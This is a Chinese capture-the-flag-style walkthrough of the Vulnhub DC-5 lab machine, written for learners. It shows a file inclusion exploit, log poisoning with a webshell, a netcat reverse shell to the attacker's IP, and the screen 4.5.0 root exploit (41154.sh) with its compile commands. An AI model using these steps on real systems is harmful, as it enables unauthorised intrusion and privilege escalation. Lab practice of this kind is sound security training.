# DC-5靶机解题思路

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzIyNjk0ODYxMA==&mid=2247484482&idx=5&sn=d63e3fdabac1d22a106c5c9b08cd371e&chksm=e869e72fdf1e6e39c734a4d78dca015a9236ada7b2693e028f7e20a0c7adbdd63c769e73de05&scene=126&sessionid=1681664374#rd](http://mp.weixin.qq.com/s?__biz=MzIyNjk0ODYxMA==&mid=2247484482&idx=5&sn=d63e3fdabac1d22a106c5c9b08cd371e&chksm=e869e72fdf1e6e39c734a4d78dca015a9236ada7b2693e028f7e20a0c7adbdd63c769e73de05&scene=126&sessionid=1681664374#rd)

说明：Vulnhub是一个渗透测试实战网站，提供了许多带有漏洞的渗透测试靶机下载。适合初学者学习，实践。DC-5全程只有一个falg，获取root权限，以下内容是自身复现的过程，总结记录下来，如有不足请多多指教。

  

下载地址：

Download (Mirror): 

https://download.vulnhub.com/dc/DC-5.zip

  

目标机IP地址：192.168.5.140  
攻击机kali IP地址：192.168.5.135

  

arp-scan -l 发现目标ip。

![](../Images/868a1a4226c895316c5b8a54e8b2e831.png)

  

nmap端口扫描，开发了80端口。  

nmap -sV -p- 192.168.5.140

![](../Images/ab8dd241fad1de8510ce548cba203d56.png)

  

访问80端口。  

![](../Images/52de0cda2d5ecdb3287a43ed343bc192.png)

  

观察到版权标识后的年份刷新后会发生变化，怀疑是该站点有文件包含漏洞，包含了某个文件，然后渲染到页面中。  

![](../Images/b9ec45e9f842185efe6220ab6ac06945.png)

![](../Images/19df7423a2b9f0cc1ac500e25ad3e5cf.png)

  

爆破后得知该页面通过可控参数file来包含其他文件。  

http://192.168.5.140/thankyou.php?file=/etc/passwd 

确定存在文件包含漏洞。

![](../Images/8c7a0705dc5688c9e9b1dccfaf4f64a1.png)

  

/var/log/nginx/error.log Nginx日志文件，将一句话写入到日志文件里。

写入一句话成功后，蚁剑链接。

![](../Images/3f2091919cbfc8742d4265a1e11ef6be.png)

![](../Images/4194e48c681523427173e5a36e91842e.png)

  

反弹shell。

 nc -e /bin/bash 192.168.5.135 7777

 并转换交互模式。

python -c 'import pty;pty.spawn("/bin/bash")'  

![](../Images/ea10eb6cbd5f856fc7463ddc9d257e49.png)

![](../Images/f8ac826906c1e69a6186ac43d97f7037.png)

  

查找一下可以用root权限运行的命令；

find / -perm -u=s -type f 2>/dev/null

![](../Images/ae8a94feff2ecb621965e65ab57d48ef.png)

  

发现 screen 4.5.0， screen 4.5.0 是由提权漏洞的，搜索利用方式。

![](../Images/e662a88d551de6af9bf3a77170cc562f.png)

  

搜索文件位置查看利用方式。  

/usr/share/exploitdb/exploits/linux/local/41154.sh

chmod 777 41154.sh 

重新设置文件格式。

:set:ff 回车  

:set ff=unix

:wq

41154.sh脚本中分三部分，将第一部分、第二部分的c语言代码抽离，独立保存，根据里面的提示进行编译。

![](../Images/954ff8bdc8fdd8ec40290715caa2e6ee.png)

  

将第一部分C语言代码保存到libhax.c。

![](../Images/4411c5498ab7cccc2186fdbc4a21d2aa.png)

  

根据提示进行编译，编译后删除源文件。  

gcc -fPIC -shared -ldl -o libhax.so libhax.c 

![](../Images/4843b66b000de5c0eae407d9dfdfdd4d.png)

 

把下面部分c语言代码也单独复制出来取文件名为rootshell.c。

![](../Images/dececc77560534c52127b33615f357f4.png)

  

根据提示进行编译，编译后删除源文件。

gcc -o rootshell rootshell.c

![](../Images/016173ffc6c6dd3115191e57cec95d7b.png)

  

将41154.sh 进行修改，并且改名为dc5.sh。

![](../Images/a66f3925bccca8acd99487d3d93b70c9.png)

  

开启ftp服务：  

apt-get install vsftpd

vsftpd服务开启ftp。

![](../Images/1047fbdf5bf39571badad7579dd64b03.png)

![](../Images/601e731137bcddb0dbe1f8e911af87c2.png)

  

查看文件的权限。/tmp下文件可任意读写，ftp链接，将编译好的文件下载到本地/tmp下。  

![](../Images/c1dd00df2c461dbf618921aba40bb3da.png)

![](../Images/958416f265538f0fa799865de7892869.png)

![](../Images/33612d520f15da20d197eb2e38b9b87e.png)

![](../Images/0aea9da600569664f42b4db3b453ed88.png)

  

chmod +x dc5.sh 执行权限，然后执行。/dc5.sh 获取root权限。

![](../Images/c1e19059aaf897919fde50e942cd96f5.png)

![](../Images/e022bc1e5e32346fa037379ecbe458eb.png)
